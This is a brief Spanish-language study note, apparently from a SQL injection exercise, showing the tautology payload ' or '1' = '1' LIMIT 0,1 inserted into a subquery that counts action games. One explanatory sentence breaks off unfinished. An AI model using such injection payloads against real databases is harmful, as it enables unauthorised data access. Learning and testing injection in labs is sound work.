## Query 1

### Inyección: ` or '1' = '1' LIMIT 0,1`

El payload ` or '1' = '1' LIMIT 0,1` resuelve lo siguiente:

1. se debe poner `LIMIT` ya que este tipo de query solo arroja un resultado, en caso de poner únicamente el `or 1 = 1`

````sql
# Original
SELECT COUNT(*) AS total_juegos_accion FROM juegos WHERE genero_id = (SELECT genero_id FROM generos WHERE nombre = 'Acción');

SELECT COUNT(*) AS total_juegos_accion FROM juegos WHERE genero_id = (SELECT genero_id FROM generos WHERE nombre = 'Acción' or 1 = 1 LIMIT 0,1);
````
